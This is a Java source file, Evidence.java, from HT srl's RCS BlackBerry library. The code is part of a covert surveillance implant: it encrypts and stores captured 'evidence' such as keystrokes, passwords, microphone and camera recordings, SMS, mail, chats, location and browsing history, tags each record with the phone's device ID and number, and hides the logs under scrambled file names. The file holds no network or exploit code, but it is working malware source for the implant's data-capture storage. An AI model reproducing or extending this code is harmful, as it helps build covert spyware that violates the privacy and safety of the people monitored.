//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Log.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.evidence;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.util.DataBuffer;
import blackberry.Device;
import blackberry.Status;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/*  LOG FORMAT
 *
 */
/**
 * The Class Evidence (formerly known as Log.)
 */
public final class Evidence {
    private static final int E_VERSION_01 = 2008121901;
    /*
     * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
     */

    public static int E_DELIMITER = 0xABADC0DE;

    private static final long MIN_AVAILABLE_SIZE = 200 * 1024;

    //#ifdef DEBUG
    private static Debug debug = new Debug("Evidence", DebugLevel.INFORMATION);

    //#endif

    boolean firstSpace = true;

    boolean enoughSpace = true;

    Date timestamp;
    String logName;

    String fileName;
    FileConnection fconn = null;

    DataOutputStream os = null;
    Encryption encryption;
    EvidenceCollector evidenceCollector;

    EvidenceDescription evidenceDescription;
    Device device;

    int evidenceId;
    boolean onSD;

    int progressive;

    private byte[] aesKey;
    private byte[] encData;

    private int typeEvidenceId;

    /**
     * Instantiates a new evidence.
     */
    private Evidence() {
        evidenceCollector = EvidenceCollector.getInstance();
        device = Device.getInstance();

        progressive = -1;
        // timestamp = new Date();
    }

    /**
     * Instantiates a new log.
     * 
     * @param typeEvidenceId
     *            the type evidence id
     * @param aesKey
     *            the aes key
     */
    private Evidence(final int typeEvidenceId, final byte[] aesKey) {
        this();
        //#ifdef DBC
        Check.requires(aesKey != null, "aesKey null"); //$NON-NLS-1$
        //#endif

        // agent = agent_;
        this.typeEvidenceId = typeEvidenceId;
        this.aesKey = aesKey;

        encryption = new Encryption(aesKey);
        //#ifdef DBC
        Check.ensures(encryption != null, "encryption null"); //$NON-NLS-1$
        //#endif
    }

    /**
     * Instantiates a new evidence.
     * 
     * @param typeEvidenceId
     *            the type evidence id
     */
    public Evidence(final int typeEvidenceId) {
        this(typeEvidenceId, Keys.getInstance().getLogKey());
    }

    public static String memoTypeEvidence(final int typeId) {
        switch (typeId) {
            case 0xFFFF:
                return "NON";
            case 0x0000:
                return "FON";
            case 0x0001:
                return "FCA";
            case 0x0040:
                return "KEY";
            case 0x0100:
                return "PRN";
            case 0xB9B9:
                return "SNP";
            case 0xD1D1:
                return "UPL";
            case 0xD0D0:
                return "DOW";
            case 0x0140:
                return "CAL";
            case 0x0141:
                return "SKY";
            case 0x0142:
                return "GTA";
            case 0x0143:
                return "YMS";
            case 0x0144:
                return "MSN";
            case 0x0145:
                return "MOB";
            case 0x0180:
                return "URL";
            case 0xD9D9:
                return "CLP";
            case 0xFAFA:
                return "PWD";
            case 0xC2C2:
                return "MIC";
            case 0xC6C6:
                return "CHA";
            case 0xE9E9:
                return "CAM";
            case 0x0200:
                return "ADD";
            case 0x0201:
                return "CAL";
            case 0x0202:
                return "TSK";
            case 0x0210:
                return "MAI";
            case 0x0211:
                return "SMS";
            case 0x0212:
                return "MMS";
            case 0x0220:
                return "LOC";
            case 0x0230:
                return "CAL";
            case 0x0240:
                return "DEV";
            case 0x0241:
                return "INF";
            case 0x1011:
                return "APP";
            case 0x0300:
                return "SKI";
            case 0x1001:
                return "MAI";
            case 0x0213:
                return "SMS";
            case 0x1220:
                return "LOC";
            case 0xEDA1:
                return "FSS";

        }
        return "UNK";
    }

    /**
     * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
     * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
     * anche cancellato da disco e rimosso dalla coda. Questa funzione NON va
     * chiamata per i markup perche' la WriteMarkup() e la ReadMarkup() chiudono
     * automaticamente l'handle.
     * 
     * @return true, if successful
     */
    public synchronized boolean close() {
        boolean ret = true;
        encData = null;

        if (os != null) {
            try {
                os.close();
            } catch (final IOException e) {
                ret = false;
            }
        }

        if (fconn != null) {
            try {
                fconn.close();
            } catch (final IOException e) {
                ret = false;
            }
        }

        os = null;
        fconn = null;
        return ret;
    }

    public synchronized boolean createEvidence() {
        return createEvidence(null);
    }

    /**
     * Questa funzione crea un file di log e lascia l'handle aperto. Il file
     * viene creato con un nome casuale, la chiamata scrive l'header nel file e
     * poi i dati addizionali se ce ne sono. LogType e' il tipo di log che
     * stiamo scrivendo, pAdditionalData e' un puntatore agli eventuali
     * additional data e uAdditionalLen e la lunghezza dei dati addizionali da
     * scrivere nell'header. Il parametro facoltativo bStoreToMMC se settato a
     * TRUE fa in modo che il log venga salvato nella prima MMC disponibile, se
     * non c'e' la chiama fallisce. La funzione torna TRUE se va a buon fine,
     * FALSE altrimenti.
     * 
     * @param additionalData
     *            the additional data
     * @return true, if successful
     */
    public synchronized boolean createEvidence(final byte[] additionalData) {
        //#ifdef DEBUG
        debug.trace("createLog evidenceType: " + typeEvidenceId);
        //#endif

        //#ifdef DBC
        Check.requires(os == null && fconn == null,
                "createLog: not previously closed");
        //#endif

        timestamp = new Date();

        int additionalLen = 0;

        if (additionalData != null) {
            additionalLen = additionalData.length;
        }

        enoughSpace = enoughSpace(onSD);
        if (!enoughSpace) {
            //#ifdef DEBUG
            debug.trace("createEvidence, no space");
            //#endif
            return false;
        }

        final Vector tuple = evidenceCollector.makeNewName(this,
                memoTypeEvidence(typeEvidenceId), onSD);
        //#ifdef DBC
        Check.asserts(tuple.size() == 5, "Wrong tuple size");
        //#endif

        progressive = ((Integer) tuple.elementAt(0)).intValue();
        final String basePath = (String) tuple.elementAt(1);
        final String blockDir = (String) tuple.elementAt(2);
        final String encName = (String) tuple.elementAt(3);
        final String plainFileName = (String) tuple.elementAt(4);

        final String dir = basePath + blockDir + "/";
        final boolean ret = Path.createDirectory(dir);

        if (!ret) {
            //#ifdef DEBUG
            debug.error("Dir not created: " + dir);
            //#endif
            return false;
        }

        fileName = dir + encName;
        //#ifdef DBC
        Check.asserts(fileName != null, "null fileName");
        Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_EXTENSION),
                "file not scrambled");
        Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
        //#endif

        //#ifdef DEBUG
        debug.trace("createLog fileName:" + fileName);
        //#endif
        try {
            fconn = (FileConnection) Connector.open("file://" + fileName);

            if (fconn.exists()) {
                close();
                //#ifdef DEBUG
                debug.fatal("It should not exist:" + fileName);
                //#endif

                return false;
            }

            //#ifdef DEBUG
            debug.info("Created: " + fileName);
            //#endif

            final byte[] plainBuffer = makeDescription(additionalData,
                    typeEvidenceId);
            //#ifdef DBC
            Check.asserts(plainBuffer.length >= 32 + additionalLen,
                    "Short plainBuffer");
            //#endif

            fconn.create();
            os = fconn.openDataOutputStream();

            final byte[] encBuffer = encryption.encryptData(plainBuffer);
            //#ifdef DBC
            Check.asserts(encBuffer.length == Encryption
                    .getNextMultiple(plainBuffer.length), "Wrong encBuffer");
            //#endif

            // scriviamo la dimensione dell'header paddato
            os.write(Utils.intToByteArray(plainBuffer.length));
            // scrittura dell'header cifrato
            os.write(encBuffer);
            os.flush();

            //#ifdef DBC
            Check.asserts(fconn.fileSize() == encBuffer.length + 4,
                    "Wrong filesize");
            //#endif

            //#ifdef DEBUG
            debug.trace("additionalData.length: " + plainBuffer.length);
            debug.trace("encBuffer.length: " + encBuffer.length);
            //#endif

        } catch (final IOException ex) {
            //#ifdef DEBUG
            debug.error("file: " + plainFileName + " ex:" + ex);
            //#endif
            return false;
        }

        //#ifdef DBC
        Check.ensures(os != null, "null os");
        //#endif

        return true;
    }

    private boolean enoughSpace(boolean onSD) {
        long free = 0;
        if (onSD) {
            free = Path.freeSpace(Path.SD);
        } else {
            free = Path.freeSpace(Path.USER);
        }

        if (free < MIN_AVAILABLE_SIZE) {
            //#ifdef DEBUG
            if (firstSpace) {
                firstSpace = false;

                debug.fatal("not enough space. Free : " + free);
            }
            //#endif

            return false;
        } else {
            return true;
        }
    }

    public synchronized byte[] plainEvidence(final byte[] additionalData,
            final int logType, final byte[] data) {

        //final byte[] encData = encryption.encryptData(data, 0);

        int additionalLen = 0;

        if (additionalData != null) {
            additionalLen = additionalData.length;
        }

        final byte[] plainBuffer = makeDescription(additionalData, logType);
        //#ifdef DBC
        Check.asserts(plainBuffer.length >= 32 + additionalLen,
                "Short plainBuffer");
        //#endif

        // buffer completo
        byte[] buffer = new byte[additionalData.length + data.length + 8];
        DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length, false);

        // scriviamo la dimensione dell'header paddato
        databuffer.writeInt(plainBuffer.length);
        // scrittura dell'header cifrato
        databuffer.write(additionalData);

        // scrivo il contenuto
        databuffer.writeInt(data.length);
        databuffer.write(data);

        return buffer;
    }

    public boolean writeEvidence(final byte[] data) {
        return writeEvidence(data, 0);
    }

    /**
     * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel
     * file di log creato con CreateLog(). La funzione torna TRUE se va a buon
     * fine, FALSE altrimenti.
     * 
     * @param data
     *            the data
     * @return true, if successful
     */
    public synchronized boolean writeEvidence(final byte[] data, int offset) {
        if (os == null) {
            //#ifdef DEBUG
            debug.error("os null");
            //#endif
            return false;
        }

        if (fconn == null) {
            //#ifdef DEBUG
            debug.error("fconn null");
            //#endif
            return false;
        }

        if (Status.self().wantLight()) {
            // green
            Debug.ledFlash(Debug.COLOR_GREEN_LIGHT);
        }

        encData = encryption.encryptData(data, offset);
        //#ifdef DEBUG
        debug.trace("writeEvidence encdata: " + encData.length);
        //#endif

        try {
            os.write(Utils.intToByteArray(data.length - offset));
            os.write(encData);
            os.flush();
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Error writing file: " + e);
            //#endif
            return false;
        }

        return true;
    }

    public byte[] getEncData() {
        return encData;
    }

    /**
     * Write logs.
     * 
     * @param bytelist
     *            the bytelist
     * @return true, if successful
     */
    public boolean writeEvidences(final Vector bytelist) {
        int totalLen = 0;
        for (int i = 0; i < bytelist.size(); i++) {
            final byte[] token = (byte[]) bytelist.elementAt(i);
            totalLen += token.length;
        }

        final int offset = 0;
        final byte[] buffer = new byte[totalLen];
        final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen, false);

        for (int i = 0; i < bytelist.size(); i++) {
            final byte[] token = (byte[]) bytelist.elementAt(i);
            databuffer.write(token);
        }

        //#ifdef DEBUG
        debug.trace("len: " + buffer.length);
        //#endif

        return writeEvidence(buffer);
    }

    // pubblico solo per fare i test
    /**
     * Make description.
     * 
     * @param additionalData
     *            the additional data
     * @return the byte[]
     */
    public byte[] makeDescription(final byte[] additionalData, final int logType) {

        if (timestamp == null) {
            timestamp = new Date();
        }

        int additionalLen = 0;

        if (additionalData != null) {
            additionalLen = additionalData.length;
        }

        final DateTime datetime = new DateTime(timestamp);

        evidenceDescription = new EvidenceDescription();
        evidenceDescription.version = E_VERSION_01;
        evidenceDescription.logType = logType;
        evidenceDescription.hTimeStamp = datetime.hiDateTime();
        evidenceDescription.lTimeStamp = datetime.lowDateTime();
        evidenceDescription.additionalData = additionalLen;
        evidenceDescription.deviceIdLen = device.getWDeviceId().length;
        evidenceDescription.userIdLen = device.getWUserId().length;
        evidenceDescription.sourceIdLen = device.getWPhoneNumber().length;

        final byte[] baseHeader = evidenceDescription.getBytes();
        //#ifdef DBC
        Check.asserts(baseHeader.length == evidenceDescription.length,
                "Wrong log len");
        //#endif

        final int headerLen = baseHeader.length
                + evidenceDescription.additionalData
                + evidenceDescription.deviceIdLen
                + evidenceDescription.userIdLen
                + evidenceDescription.sourceIdLen;
        final byte[] plainBuffer = new byte[Encryption
                .getNextMultiple(headerLen)];

        final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
                plainBuffer.length, false);
        databuffer.write(baseHeader);
        databuffer.write(device.getWDeviceId());
        databuffer.write(device.getWUserId());
        databuffer.write(device.getWPhoneNumber());

        if (additionalLen > 0) {
            databuffer.write(additionalData);
        }

        return plainBuffer;
    }

    public static void info(final String message) {
        try {
            final Evidence logInfo = new Evidence(EvidenceType.INFO);

            logInfo.atomicWriteOnce(message);

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }
    }

    public synchronized void atomicWriteOnce(byte[] additionalData,
            byte[] content) {
        createEvidence(additionalData);
        writeEvidence(content);
        close();
    }

    public synchronized void atomicWriteOnce(Vector bytelist) {
        createEvidence(null);
        writeEvidences(bytelist);
        close();
    }

    public synchronized void atomicWriteOnce(byte[] plain) {
        createEvidence(null);
        writeEvidence(plain);
        close();
    }

    public synchronized void atomicWriteOnce(String string) {
        createEvidence(null);
        writeEvidence(WChar.getBytes(string, true));
        close();
    }

}
